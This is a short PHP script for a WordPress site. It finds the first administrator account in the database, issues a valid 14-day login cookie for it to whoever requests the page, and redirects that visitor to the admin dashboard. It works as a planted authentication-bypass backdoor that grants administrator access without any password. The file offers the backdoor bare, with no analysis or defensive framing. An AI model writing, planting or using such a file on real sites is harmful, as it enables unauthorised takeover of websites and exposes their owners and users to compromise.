<?php
define('SHORTINIT', true);
require_once('./wp-load.php');

global $wpdb;
$admin_user = $wpdb->get_row("
    SELECT u.ID, u.user_login 
    FROM {$wpdb->users} u 
    INNER JOIN {$wpdb->usermeta} um ON u.ID = um.user_id 
    WHERE um.meta_key = '{$wpdb->prefix}capabilities' 
    AND um.meta_value LIKE '%administrator%' 
    LIMIT 1
");

if (!$admin_user) {
    exit("Admin tidak ditemukan.");
}

$expiration = time() + (14 * DAY_IN_SECONDS);
$cookie = wp_generate_auth_cookie($admin_user->ID, $expiration, 'logged_in');

setcookie(LOGGED_IN_COOKIE, $cookie, $expiration, COOKIEPATH, COOKIE_DOMAIN, is_ssl(), true);
if ( COOKIEPATH != SITECOOKIEPATH ) {
    setcookie(LOGGED_IN_COOKIE, $cookie, $expiration, SITECOOKIEPATH, COOKIE_DOMAIN, is_ssl(), true);
}

wp_redirect(admin_url());
exit;
?>
